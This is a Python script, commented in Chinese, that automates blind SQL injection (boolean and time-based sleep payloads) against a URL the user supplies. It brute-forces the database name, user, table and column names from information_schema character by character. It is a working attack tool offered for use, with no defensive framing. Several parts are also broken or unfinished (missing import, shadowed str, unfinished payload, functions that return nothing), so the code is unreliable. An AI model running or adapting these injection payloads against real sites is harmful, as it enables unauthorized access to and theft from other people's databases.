#!usr/bin/python
#!encoding=utf8

from urllib import request
from urllib.parse import urlparse
from urllib.parse import urlunsplit
import re
import requests
import time


headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}

class SQL():
    def __init__(self,url,check_text,check_way):
        if re.match("http[s]",url):
            self.url=url        #设置全局url
        else:
            self.url="http://"+url
        print(self.url)
        self.check_text=check_text   #设置全局验证内容
        self.check_way=check_way     #设置验证方法
        self.ParseURL(url)  #解析url，拆分
        self.RUN()          #启动




    def ParseURL(self,url):
        '''
        解析URL，拆分
        :return:
        '''
        parse_url=urlparse(url)
        self.url_scheme=parse_url.scheme
        self.url_netloc=parse_url.netloc
        self.url_path=parse_url.path
        self.url_params=parse_url.params
        self.url_query=parse_url.query
        self.url_comment=parse_url.fragment


    def Check(self,text):
        '''
        检验布尔，若网页返回值有特征码，返回True
        :param text: 网页返回值
        :return:
        '''
        if self.check_text in text:      #如果结果出现预先得到的测量值，返回布尔成功
            return True
        else:
            return False



    def RUN(self):
        '''
        启动爆破
        :return:
        '''

        self.GuessTables()


    def BurpLength(self,data):
        '''
        爆破数据长度脚本
        :param data:系统变量名
        :return:数据长度
        '''
        for i in range(1,256):
            X="{0} and if(length({1})={2},{3},1) %23".format(self.url,data,i,self.check_way)
            #print(X)
            time.sleep(0.1)
            res=requests.get(X,headers=headers)
            dum=requests.get(X,headers={'Connection':'close'})   #关闭网络流
            #print(res.text)
            if self.Check(res.text):         #传入判断
                return i



    def BurpDatasLength(self,data,table,num):
        '''
        爆破数据
        :param data: 查询数据
        :param table: 查询表
        :param num: 数量
        :return:
        '''
        length = []  # 存放各表长度
        for i in range(1, num + 1):
            for j in range(1, 100):
                X = "{0} and IF((select length({3}) from information_schema.{4} where table_schema=database() limit {1} ,1)={2},{5},1) %23".format(
                    self.url, i, j,data,table,self.check_way)
                time.sleep(0.1)
                res = requests.get(X, headers=headers)
                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                if self.Check(res.text):     #传入判断
                    length.append(j)
                    break



    def BurpChars(self,data,length):
        '''
        爆破数据，系统变量专用
        :param data:爆破对象
        :param length:对象长度
        :return: 爆破结果
        '''
        x=[]
        #length=int(length)
        for i in range(1,length+1):
            for j in range(32,127):
                X = "{0} and IF(ascii(substr({1},{2},1))={3},{4},1) %23".format(self.url, data, i, j,self.check_way)
                time.sleep(0.1)
                res = requests.get(X, headers=headers)
                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                if self.Check(res.text):      #传入判断
                    x.append(chr(j))
                    break
        x="".join(x)                        # list>>str
        return x




    def BurpTables(self,num):
        '''
        爆破表名
        :param num: 表数量
        :return: 存储表名称的list
        '''
        length=self.BurpDatasLength("table_name","tables",num)     #存放各表长度的list
        m=[]                    #存储当前字母
        n=[]                    #存储当前完整结果

        for i in range(1,num+1):
            for l in range(1,length[i]+1):
                for j in range(32,127):
                    X="{0} and IF((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{1},1)={2},{3},1)%23".format(self.url,l,j,self.check_way)
                    time.sleep(0.1)
                    res = requests.get(X, headers=headers)
                    dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                    if self.Check(res.text):        #传入判断
                        m.append(chr(j))
            n.append(m)
            m=''
        return n




    def BurpColumns(self,num,table):
        '''
        爆破列名
        :param num: 列数量
        :param table:
        :return:
        '''
        length = []  # 存放各列长度
        for i in range(1, num + 1):
            for j in range(1, 100):
                X = "{0} and IF((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit {1} ,1)={2},{3},1) %23".format(
                    self.url, i, j, self.str_to_hex(table),self.check_way)
                time.sleep(0.1)
                res = requests.get(X, headers=headers)
                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                if self.Check(res.text):     #传入判断
                    length.append(j)         # list拼接
                    break

        m = []  # 存储当前字母
        n = []  # 存储当前完整结果

        for i in range(1, num + 1):
            for l in range(1, length[i]+1):
                for j in range(32, 127):
                    X = "{0} and IF((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit 0,1),{1},1)={2},{4},1)%23".format(
                        self.url, l, j,self.str_to_hex(table),self.check_way)
                    time.sleep(0.1)
                    res = requests.get(X, headers=headers)
                    dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                    if self.Check(res.text):   #传入判断
                        m.append(chr(j))       #拼接字母
            n.append(m)                        #名称拼接入list
            m = ''                             #临时存储点置空
        return n

    def BurpDatas(self,columns):
        '''
        爆破数据
        :param columns:列list
        :return:
        '''
        data=[]      #数据名称list
        for column in columns:
            for j in range(32,127):
                X="{0} and IF(ascii(select {1} from {2} limit 0,1),{3},1))={4},{5},1) %23".format(self.url,column,"table","length",j,self.check_way)
                # 上式未完成，table，length
                time.sleep(0.1)
                res = requests.get(X, headers=headers)
                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                if self.Check(res.text):     #传入判断
                    data.append(i)  # 存储各列数据入list
                    break




    def str_to_hex(self,str):
        '''
        字符串转16进制
        :param str: 字符串
        :return: 字符串的16进制
        '''
        m = []
        for a in str:
            m.append(str(ord(a)))   #先转为ASCII码，10进制
        n = "".join(m)              #ASCII码拼接
        n = int(n)                  #转为整型
        res=hex(n)                  #单位转换，10=>16
        return str(res)             #返回字符串





    def GuessColumns(self, tables):
        '''
        猜测列名
        :param tables:包含所有表名的list
        :return:
        '''

        num_columns=[]     #存储各表的列数量
        for table in tables:   #逐个取表名
            for i in range(1,100):    #列名长度范围
                X="{0} and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name={2})={1},{3},1) %23".format(self.url,i,self.str_to_hex(table),self.check_way)  #获取表数量
                # print(X)
                time.sleep(0.1)
                res = requests.get(X, headers=headers)
                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                if self.Check(res.text):                      #传入判断
                    num_columns.append(i)                     #存储各表中列数量
                    break


        for num,table in num_columns,tables:                   #依次获取表的列数量及名称
            if num !=0:                                        #若为空表，退出
                length = []  # 存放各列长度
                for i in range(1, num + 1):
                    for j in range(1, 100):
                        X = "{0} and IF((select length({3}) from information_schema.columns where table_schema=database() and table_name={4} limit {1} ,1)={2},sleep(5),1) %23".format(
                            self.url, i, j, "column_name",self.str_to_hex(table))
                        time.sleep(0.1)
                        res = requests.get(X, headers=headers)
                        dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
                        if self.Check(res.text):                #传入判断
                            length.append(j)
                            break


                for l in length:
                    Column=[]
                    x=self.BurpColumns()
                    Column.append(x)
                    self.columns="".join(column)

            else:
                break
        self.BurpDatas(self.columns)        #爆破列数据




    def GuessTables(self):
        '''
        猜测数据表
        :return:
        '''
        self.length_database=self.BurpLength("database()")    #获取数据库名称长度
        self.length_user=self.BurpLength("user()")            #获取数据库用户名称长度
        print("数据库名称长度"+str(self.length_database))
        print("数据库用户名称长度"+str(self.length_user))

        self.database=self.BurpChars("database()",self.length_database)    #获取数据库名称
        self.db_user=self.BurpChars("user()",self.length_user)             #获取数据库用户名名称
        print(self.database)
        print(self.db_user)

        for i in range(1,100):
            X="{0} and if((select count(table_name) from information_schema.tables where table_schema=database())={1},sleep(5),1) %23".format(self.url,i)  #获取表数量
            # print(X)
            time.sleep(0.1)
            res = requests.get(X, headers=headers)
            dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
            if self.Check(res.text):
                self.number_tables=i                     #表数量
                break

        self.Tables=self.BurpTables(self.number_tables)       #接收表名称的list
        self.GuessColumns(self.Tables)







def main():
    try:
        url=sys.argv[1]
    except:
        url=input("请输入带参闭合的URL，例子：www.domain.com/?id=1'\n")
    check_way=input("请选择判断方式：1,页面内容变动判断 2,延时注入\n")
    if check_way == "1":
        check_way="0"        #查询成功时的返回值
        check_text=input("请输入页面布尔注入成功后的特征值，源码可见：\n")
        SQL(url, check_text,check_way)
    else:
        check_way="sleep(5)"    #延时注入条件
        check_text=""           #此时没必要存在
        SQL(url,check_text,check_way)





if __name__ =="__main__":
    main()